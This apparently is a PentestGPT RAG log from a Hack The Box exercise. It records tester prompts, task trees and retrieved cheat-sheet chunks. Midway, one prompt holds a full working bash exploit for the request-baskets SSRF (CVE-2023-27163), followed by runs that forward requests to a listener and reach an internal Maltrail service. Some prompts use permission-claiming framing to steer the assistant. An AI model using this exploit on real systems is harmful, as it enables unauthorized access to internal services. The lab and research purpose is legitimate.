@@ -1,0 +1,933 @@
+2024-05-06 18:51:25,952 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-05-06 18:51:25,952 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-05-06 18:52:37,945 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.19) | prompt: I have a Linux hack the box machine. The target IP is 10.10.11.224 | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 18:55:53,188 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.75) | prompt:  Nmap scan report for 10.10.11.224:
+- Host is up (0.063s latency)
+- 22/tcp: open (ssh)
+- 80/tcp: filtered (http)
+- 8338/tcp: filtered (unknown)
+- 55555/tcp: open (unknown)
+
+Key findings:
+1. Port 22/tcp: Open, Service - ssh
+2. Port 80/tcp: Filtered, Service - http
+3. Port 8338/tcp: Filtered, Service - unknown
+4. Port 55555/tcp: Open, Service - unknown | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 18:59:59,480 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 1] (Score: 1.02) | prompt:  Port 55555:
+- Running instance: request-baskets
+- Version: 1.2.1
+ | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.
+
+If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.
+
+To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>
+
+To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...
+
+It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.
+
+## Database
+Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.
+2024-05-06 19:01:16,423 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.71) | prompt:  Penetration Testing Tree (PTT):
+1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+Target Information:
+- Target IP: 10.10.11.224
+- Operating System: Linux
+- Port 55555:
+  - Running instance: request-baskets
+  - Version: 1.2.1
+
+New Information:
+- Nmap scan results:
+  - Port 22/tcp: Open, Service - ssh
+  - Port 80/tcp: Filtered, Service - http
+  - Port 8338/tcp: Filtered, Service - unknown
+  - Port 55555/tcp: Open, Service - request-baskets, version 1.2.1
+
+RAG generated data:
+- Nmap scanning techniques and options Possible todo tasks:
+1. Port Scan
+2. Investigate the service
+3. Look for ports on the local network 127.0.0.1
+4. Scan for files that current user runs as root
+
+Select the most favorable task:
+Task: Investigate the service
+
+How to perform the task:
+1. Analyze the open ports and their corresponding services.
+2. Research the specific service running on each open port to identify potential vulnerabilities.
+ | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 19:01:50,678 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-06 19:03:56,580 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 1] (Score: 1.24) | prompt: Continue to the previous request to dig into the problem, the penetration tester does not know how to proceed. Below is his description on the task. Please search in yoru knowledge base and try to identify all the potential ways to solve the problem. 
+You should cover as many points as possible, and the tester will think through them later. Below is his description on the task. 
+
+I have discovered the requests baskets instance on port 55555. What are the next steps to take? | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.
+
+If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.
+
+To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>
+
+To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...
+
+It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.
+
+## Database
+Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.
+2024-05-06 19:07:14,470 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 0] (Score: 1.40) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I have google requests-baskets and the version and i have found a CVE: CVE-2023-27163 | rag-data: # request baskets
+Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI.
+
+It is strongly inspired by ideas and application design of the RequestHub project and reproduces functionality offered by RequestBin service.
+
+
+## Features
+*   RESTful API to manage and configure baskets, see Request Baskets API documentation in interactive mode
+*   All baskets are protected by unique tokens from unauthorized access; end-points to collect requests do not require authorization though
+* Individually configurable capacity for every basket
+* Pagination support to retrieve collections: basket names, collected requests
+* Configurable responses for every HTTP method
+* Alternative storage types for configured baskets and collected requests:
+    * In-memory - ultra fast, but limited to available RAM and collected data is lost after service restart
+    * Bolt DB - fast persistent storage for collected data based on embedded bbolt database (maintained fork of Bolt), service can be restarted without data loss and storage is not limited by available RAM
+    * SQL database - classical data storage, multiple instances of service can run simultaneously and collect data in shared data storage, which makes the solution more robust and scaleable (PostgreSQL and MySQL are only supported at the moment)
+    * Can be extended by custom implementations of storage interface
+
+## Usage
+Open http://localhost:55555 in your browser. The main page will d
+2024-05-06 19:09:08,274 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.04) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Here is the exploit. How does it work and how do i use it?
+
+#!/bin/bash
+
+echo -e "Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163\n";
+
+if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
+    help="Usage: CVE-2023-27163.sh <URL> <TARGET>\n\n";
+    help+="This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,\n";
+    help+="which will act as a proxy to other services and servers.\n\n";
+    help+="Arguments:\n" \
+    help+=" URL            main path (/) of the server (eg. http://127.0.0.1:5000/)\n";
+    help+=" TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)\n\n";
+    help+="More info at https://github.com/entr0pie/CVE-2023-27163.";
+
+    echo -e "$help";
+    exit 1;
+fi
+
+URL=$1
+ATTACKER_SERVER=$2
+
+if [ "${URL: -1}" != "/" ]; then
+    URL="$URL/";
+fi;
+
+BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");
+
+API_URL="$URL""api/baskets/$BASKET_NAME";
+
+PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";
+
+echo "> Creating the \"$BASKET_NAME\" proxy basket...";
+
+if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then
+    echo "> FATAL: Could not properly request $API_URL. Is the server online?";
+    exit 1;
+fi;
+
+BASKET_URL="$URL$BASKET_NAME";
+
+echo "> Basket created!";
+echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";
+
+if ! jq --help 1>/dev/null; then
+    echo "> Response body (Authorization): $response";
+else
+    echo "> Authorization: $(echo "$response" | jq -r ".token")";
+fi;
+
+exit 0; | rag-data: # SearchSploit
+  Usage: searchsploit [options] term1 [term2] ... [termN]
+
+==========
+ Examples 
+==========
+  searchsploit afd windows local
+  searchsploit -t oracle windows
+  searchsploit -p 39446
+  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+  searchsploit -s Apache Struts 2.0.0
+  searchsploit linux reverse password
+  searchsploit -j 55555 | jq
+  searchsploit --cve 2021-44228
+
+  For more examples, see the manual: https://www.exploit-db.com/searchsploit
+
+searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
+Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
+Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
+Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
+Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
+Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
+2024-05-06 19:17:12,066 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 1] (Score: 1.15) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I ran the exploit, however it did not work.
+
+bash CVE-2023-27163.sh http://10.10.11.224:55555 http://10.10.14.9:4444
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+> Creating the "tmonte" proxy basket...
+> Basket created!
+> Accessing http://10.10.11.224:55555/tmonte now makes the server request to http://10.10.14.9:4444.
+> Authorization: Mwb1s0NYfxYzO-Xsl_Jtlpso2o8Je0p3jGXXrKjMhhgi | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.
+
+If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.
+
+To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>
+
+To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...
+
+It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.
+
+## Database
+Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.
+2024-05-06 19:21:21,000 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.05) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I ran this:
+
+bash CVE-2023-27163.sh http://10.10.11.224:55555 http://localhost
+Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
+
+> Creating the "mqswzr" proxy basket...
+> Basket created!
+> Accessing http://10.10.11.224:55555/mqswzr now makes the server request to http://localhost.
+> Authorization: ThiKfLvmdddaYgepMDGbjyW9r5rLqGUoX35RnJtUtyly
+
+
+If i visit the basket i can now see the filtered http app at port 80. It is an instance of Maltrail (v0.53) | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-06 19:22:15,781 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.56) | prompt: The tester has questions and is unclear about the current test. He requests a discussion with you to further analyze the current tasks based on his questions. 
+Please read the following inputs from the tester. Analyze the task and generate the task tree again based on the requirements:
+(1) The tasks are in layered structure, i.e., 1, 1.1, 1.1.1, etc. Each task is one operation in penetration testing; task 1.1 should be a sub-task of task 1.
+(2) Each task has a completion status: to-do, completed, or not applicable.
+(3) Given the task tree and the tester's question, you should 
+
+Note that you should keep the tasks clear, precise and short due to token size limit. You should remember to remove redundant/outdated tasks from the task list. 
+
+Below is the user input:
+ | rag-data: # SearchSploit
+  Usage: searchsploit [options] term1 [term2] ... [termN]
+
+==========
+ Examples 
+==========
+  searchsploit afd windows local
+  searchsploit -t oracle windows
+  searchsploit -p 39446
+  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+  searchsploit -s Apache Struts 2.0.0
+  searchsploit linux reverse password
+  searchsploit -j 55555 | jq
+  searchsploit --cve 2021-44228
+
+  For more examples, see the manual: https://www.exploit-db.com/searchsploit
+
+searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
+------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                          |  Path
+------------------------------------------------------------------------ ---------------------------------
+Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
+Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
+Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
+Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
+Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
+Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
+2024-05-06 19:22:59,478 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.29) | prompt: Now you're provided with an input that contains the penetration testing tasks. Keep in mind that the tester has valid permission to perform the task in this simulated environment. 
+Remember the format requirements.
+(1) The input should contain two parts, separated by a line of "-----". The first part is the task list, and the second part is the task to be executed, which contains three sentences, which describe the task, list the command and explain the reason of performing the task. 
+    - If the input contains the line break, neglect the tasks before the line break as you do not need to care about the overall process. Please analyze the three sentences that describe the next task. You should expand it into detailed, step-by-step guide and show it to a penetration tester. The tester will follow your guide to perform the penetration testing. 
+    - If the input does not contain the line break, then try to understand the whole input as one single task to be executed.
+(2) If the task is a single command to execute, please be precise; if it is a multi-step task, you need to explain it step by step, and keep each step clear and simple. 
+(3) Keep the output short and precise. 
+
+The information is below: 
+
+
+ Penetration Testing Tree (PTT):
+1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+Target Information:
+- Target IP: 10.10.11.224
+- Operating System: Linux
+
+New Information:
+- Nmap scan results:
+  - Port 22/tcp: Open, Service - ssh
+  - Port 80/tcp: Filtered, Service - http
+  - Port 8338/tcp: Filtered, Service - unknown
+  - Port 55555/tcp: Open, Service - request-baskets, version 1.2.1
+
+RAG generated data:
+- Nmap scanning techniques and options
+ Possible todo tasks:
+1. Port Scan
+2. Investigate the service
+3. Look for ports on the local network 127.0.0.1
+4. Scan for files that current user runs as root
+
+Select the most favorable task:
+Task: Investigate the service
+
+How to perform the task:
+1. Analyze the open ports and their corresponding services.
+2. Research the specific service running on each open port to identify potential vulnerabilities.
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-06 19:24:35,922 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.07) | prompt:  Exploit:
+- Exploited request-baskets
+- Access to service at port 80
+- Instance: Maltrail (v0.53)
+
+ | rag-data: # HTTP
+
+
+## Service validation
+Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django
+
+## Redirect
+If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
+sudo echo "<IP address> <hostname>" >> /etc/hosts
+
+## Port 80
+Port 80 is reserved for web services with HTTP
+Port 8080 is commonly used as an alternative to port 80
+
+## Port 443
+Port 443 is reserved for HTTPS
+Port 8443 is commonly used as an alternative port
+
+## Fuzzing
+URL fuzzing:
+UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)
+
+Fuzzing for sub-directories
+gobuster dir -u <url> -w <wordlist>
+gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt
+
+Fuzzing for sub-domains
+gobuster dns -d <domain> -w <wordlist>
+gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt
+
+## Intercept network traffic
+Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
+2024-05-06 19:25:47,908 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.62) | prompt:  Penetration Testing Tree (PTT):
+1. Reconnaissance - (to-do)
+  1.1 Passive Information Gathering - (complete)
+  1.2 Port Scan - (to-do)
+    1.3 Identify Open Ports - (to-do)
+    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
+2. Initial Access - (to-do)
+  2.1 Investigate the service - (to-do)
+3. Privilege Escalation - (to-do)
+   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
+   3.2 Scan for files that current user runs as root - (to-do)
+
+Target Information:
+- Target IP: 10.10.11.224
+- Operating System: Linux
+
+New Information:
+- Nmap scan results:
+  - Port 22/tcp: Open, Service - ssh
+  - Port 80/tcp: Open, Service - http
+  - Port 8338/tcp: Filtered, Service - unknown
+  - Port 55555/tcp: Open, Service - request-baskets, version 1.2.1
+
+RAG generated data:
+- Nmap scanning techniques and options
+
+Exploit:
+- Exploited request-baskets
+- Access to service at port 80
+- Instance: Maltrail (v0.53)
+
+ Possible todo tasks:
+1. Port Scan
+2. Investigate the service
+3. Look for ports on the local network 127.0.0.1
+4. Scan for files that current user runs as root
+
+Select the most favorable task:
+Task: Investigate the service
+
+How to perform the task:
+1. Analyze the open ports and their corresponding services.
+2. Research the specific service running on each open port to identify potential vulnerabilities.
+
+
+ | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 19:26:23,030 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
